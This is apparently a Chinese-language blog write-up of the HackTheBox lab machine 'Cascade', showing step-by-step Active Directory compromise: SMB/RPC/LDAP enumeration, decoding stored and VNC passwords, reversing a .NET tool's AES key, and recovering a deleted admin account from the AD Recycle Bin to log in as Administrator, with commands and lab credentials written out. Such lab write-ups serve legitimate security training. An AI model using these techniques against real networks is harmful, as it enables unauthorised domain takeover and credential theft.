---
title: "HTB Cascade"
description: "HackTheBox篇Active Directory 101系列之Cascade"

date: 2024-07-22T11:04:22+08:00
lastmod: 2025-11-11T10:11:28+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - AD Recycle Bin
---
<!--more-->

> 靶机ip：10.10.10.182

# 知识点

* TightVNC密码破解
* AD Recycle Bin滥用权限提升

# 信息收集

## nmap扫描

`nmap -sS -sV -sC -p- 10.10.10.182`

```txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-22 11:27 CST
Nmap scan report for 10.10.10.182
Host is up (0.45s latency).

PORT      STATE    SERVICE        VERSION
53/tcp    open     domain         Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open     kerberos-sec   Microsoft Windows Kerberos (server time: 2024-07-22 03:28:03Z)
135/tcp   open     msrpc          Microsoft Windows RPC
389/tcp   open     ldap           Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   filtered kpasswd5
593/tcp   filtered http-rpc-epmap
636/tcp   open     tcpwrapped
1337/tcp  filtered waste
1433/tcp  filtered ms-sql-s
3268/tcp  open     ldap           Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5722/tcp  filtered msdfsr
5985/tcp  open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  filtered http-proxy
9389/tcp  filtered adws
47001/tcp filtered winrm
49152/tcp filtered unknown
49153/tcp filtered unknown
49154/tcp open     msrpc          Microsoft Windows RPC
49155/tcp open     msrpc          Microsoft Windows RPC
49157/tcp open     ncacn_http     Microsoft Windows RPC over HTTP 1.0
49158/tcp open     msrpc          Microsoft Windows RPC
49167/tcp filtered unknown
49172/tcp filtered unknown
49173/tcp filtered unknown
50255/tcp filtered unknown
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-07-22T03:28:58
|_  start_date: 2024-07-22T03:07:52

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.17 seconds
```

从上述结果中可以发现，主机为`windows_server_2008`，域名是`cascade.local`，开启的服务有`DNS`服务、`Kerberos`服务、`rpc`服务、`ldap`服务、`SMB`服务、在`1433`端口上运行着`SQL Server`、在`8080`端口也有服务，但是大多数服务都被防火墙过滤了

## SMB

直接测试smb能不能匿名登录

`smbclient -N -L //10.10.10.182`

![image-20240722140947016](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722141009245-1281612221.png)

能成功登录但是获得不了什么重要的信息

## rpc

`rpc`看看能不能获取一些信息

`rpcclient -U "" -N 10.10.10.182`

![image-20240722141252468](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722141314680-1424103600.png)

发现能获得一些用户名

```txt
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
```

## ldap

用`ldapsearch`测试一下

`ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.10.10.182`

![image-20240722150112607](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722150135151-525710537.png)

找到`Ryan Thompson`在`Cascade`上的用户名是`r.thompson`，这个名字之前`rpc`枚举出来过，同时发现在`Ryan Thompson`用户的最后一个数据项中有`cascadeLegacyPwd`数据，将其值`clk0bjVldmE=`进行解码

![image-20240722145814808](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722145836886-812006840.png)

得到解密后的数据`rY4n5eva`，疑似`r.thompson`的密码

提交后发现这真是`Ryan Thompson`的密码

测试能不能连接

`crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva`

![image-20240722150650469](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722150712665-1667520013.png)

## r.thompson-SMB

发现可以进行`smb`连接，用`smbmap`连接一下

`smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva`

![image-20240722153155560](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722153218137-609195675.png)

通过 `smbmap` 可以看到，我们只对 `Data` 目录具有可读权限，尝试连接

`smbclient \\\\10.10.10.182\\Data -U r.thompson`

![image-20240722153817069](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722153846790-786836942.png)

测试后发现只对`IT`目录有访问权限，将文件下载到本地进行观察

```sh
smb: \> mask ""
smb: \> recurse ON	 #默认情况下递归选项是OFF,在 smb 提示符下输入 recurse ON命令会将此选项切换为ON
smb: \> prompt OFF	 #默认情况下询问是否下载选项是ON,在 smb 提示符下输入prompt OFF命令会将此选项切换为OFF
smb: \> mget *		#此时可以在不询问的情况下递归下载data目录下的所有文件
```

![image-20240722162438200](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722162504399-800993694.png)

# 共享文件夹Data分析

## 破解TightVNC密码

在查找文件时，发现在`IT/Temp/s.smith`目录的`Install.reg`文件中找到了一个vnc密码

![image-20240722164021239](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722164045214-1255540472.png)

`"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f`

正常的`hex`解密是解不出来的，去网上找一下`vnc`解密的工具

[vncpwd](https://github.com/jeroennijhof/vncpwd)

![image-20240722184058650](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722184121545-909779804.png)

解密完成，发现明文密码`sT333ve2`，猜测是`s.smith`用户的

## 临时账户TempAdmin

在`/Data/IT/Email Archives/`目录下找到个文件`Meeting_Notes_June_2018.html`

![image-20240722185428846](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722185451609-2123011953.png)

从邮件中，可以获取到的有效信息是，环境迁移时会使用临时账户`TempAdmin`，并且密码与常规`admin`密码相同,当环境迁移结束后会删除临时账户。

在`/Data/IT/Logs/Ark AD Recycle Bin`目录下发现`ArkAdRecycleBin.log`日志文件

![image-20240723104034284](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723104039743-140522147.png)

从日志中我们发现`TempAdmin`帐户已移至回收站

# 横向移动

## 登录s.smith用户

先利用`crackmapexec`测试能否通过`evil-winrm`登录`s.smith`用户

`crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2`

![image-20240722190031059](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722190053646-898096504.png)

测试发现的确可以使用密码：`sT333ve2`通过`winRM`用`s.smith`账号进行远程登录

`evil-winrm -u s.smith -p 'sT333ve2' -i 10.10.10.182`

![image-20240722191053738](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722191054897-647149480.png)

成功登录

![image-20240722191133301](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722191134005-826162699.png)

在`s.smith`的`Desktop`目录找到`user.txt`

同时发现一个可疑的软链接文件`WinDirStat.lnk`

查看一下该用户所在组信息

![image-20240722192913858](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722192914972-506642969.png)

发现该用户并不在权限组中，但是发现该用户属于`Audit Share`组，接下来就可以访问`Audit`目录下的文件进行查看

## s.smith-SMB

访问`Audit`目录

`smbclient \\\\10.10.10.182\\Audit$ -U s.smith`

![image-20240722194200709](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722194201797-1094652226.png)

登陆成功，还是老办法，将文件下载到本地查看

```sh
smb: \> mask ""
smb: \> recurse ON	 #默认情况下递归选项是OFF,在 smb 提示符下输入 recurse ON命令会将此选项切换为ON
smb: \> prompt OFF	 #默认情况下询问是否下载选项是ON,在 smb 提示符下输入prompt OFF命令会将此选项切换为OFF
smb: \> mget *		#此时可以在不询问的情况下递归下载data目录下的所有文件
```

![image-20240722194912751](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722194913997-1071312517.png)

下载完成

![image-20240722195139213](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722195141176-321662553.png)

## Audit.db

首先就是在`DB`目录下找到数据库，试试能不能获取一些有用的信息 

`sqlite3 Audit.db`

![image-20240722200724571](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722200725849-1056528410.png)

只能从`Ldap`表中找到`Arksvc`用户名，密码破解不了

## CascAudit.exe文件分析

继续看`Audit`目录下的文件，先看那个`.bat`文件

`cat RunAudit.bat`

![image-20240722200947578](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722200948420-1914062784.png)

发现`CascAudit.exe`以 `db` 文件作为参数运行，查看一下`CascAudit.exe`

![image-20240722201149317](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722201149933-116365236.png)

发现这是一个`.NET`的文件，利用工具调试一下

[dnSpy](https://github.com/dnSpy/dnSpy/releases)

把所属文件夹`dump`下来丢进`dnspy`动调一下，把断点打在断开数据库连接的地方想劫持一下`password`

![image-20240722211925250](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722211926047-1402503370.png)

但是这块儿可能是我的`dnspy`有问题，一直卡在一个报错上了

![image-20240722211943214](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722211944190-800938387.png)

索性直接逆，按照它的逻辑去找`password`加密的地方，双击跟进这个加密

![image-20240722211955684](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722211956255-771745297.png)

![image-20240722211959240](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722212000049-1187622322.png)

明显的`AES`加密，给了秘钥和`iv`直接找个在线网站解了（注意先用`base64`解码）

![image-20240722212036170](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722212036892-763850826.png)

这样我们就拿到了`Arksvc`的密码`w3lc0meFr31nd`

拿到用户名密码，测试一下能不能`winrm`登录

`crackmapexec winrm 10.10.10.182 -u Arksvc -p w3lc0meFr31nd`

![image-20240722212515703](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722212516783-401250117.png)

可以登录，拿`evil-winrm`登录

`evil-winrm -i 10.10.10.182 -u Arksvc -p w3lc0meFr31nd`

![image-20240722212620250](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240722212621095-1069117083.png)

登陆成功

# AD Recycle Bin滥用权限提升

先看`Arksvc`用户有没有什么可以利用的权限

![image-20240723100620239](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723100622343-929767262.png)

发现该用户属于 `AD Recycle Bin` 组下

> 该组是用于恢复被删除的用户，组以及OU等对象的，这些对象在 `AD Recycle Bin` 中时保持其所有属性不变，这使得它们可以在任何时候被恢复。
>
> [参考链接](https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/)

前面已经知道两个重要信息，一个是管理员用户和`TempAdmin`密码一致，另一个是TempAdmin被移到了回收站

这里可以使用`Get-ADObject`枚举`AD`回收站中的对象，并过滤具有`isDeleted`属性的已删除对象即可

```powershell
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```

![image-20240723105115495](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723105119052-1568759036.png)

发现最后一条数据是我们之前提到的`TempAdmin`，获取该帐户的所有详细信息

`Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *`

![image-20240723105310378](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723105313412-659440464.png)

注意到密码值很可能是`base64`编码，解码一下

![image-20240723105356090](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723105357920-613810809.png)

获取`TempAdmin`的明文密码：`baCT3r1aN00dles`

因为之前提到过`TempAdmin`的密码跟正常管理员密码一样，所以我们直接测试能否使用这个密码远程登陆`Administrator`

`crackmapexec winrm 10.10.10.182 -u Administrator -p baCT3r1aN00dles`

![image-20240723105748085](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723105753291-1398855670.png)

发现可以登录，我们直接登录`Administrator`

`evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles`

![image-20240723105922917](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723105924743-1476469846.png)

登陆成功！

![image-20240723110503914](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723110506025-2001758700.png)

最后在`Desktop`目录找到`root.txt`